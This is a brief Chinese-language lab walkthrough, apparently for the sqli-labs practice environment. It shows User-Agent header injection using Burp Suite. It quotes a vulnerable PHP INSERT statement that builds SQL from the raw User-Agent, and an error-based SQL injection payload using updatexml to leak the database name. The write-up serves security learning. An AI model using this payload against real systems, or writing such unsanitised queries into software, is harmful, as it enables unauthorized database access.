# 使用 Burp Suite 进行 Header Injection

1. 首先我们需要争取到一个 username 和 password

2. 看到页面返回了 User Agent : ![image-20240504191737723](C:\Users\A2140\AppData\Roaming\Typora\typora-user-images\image-20240504191737723.png)

3. 查看 php 源码得知注入点就在 $uagent

4. ```php
   $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
   ```

5. 先用 Burp Suite 拦截，修改 User-Agent 后再向服务器发送请求

6. 利用报错信息得到期望的数据库信息

7. ```
   User-Agent: 1'or updatexml(1,concat('~',(select database())),3),2,3)#
   ```



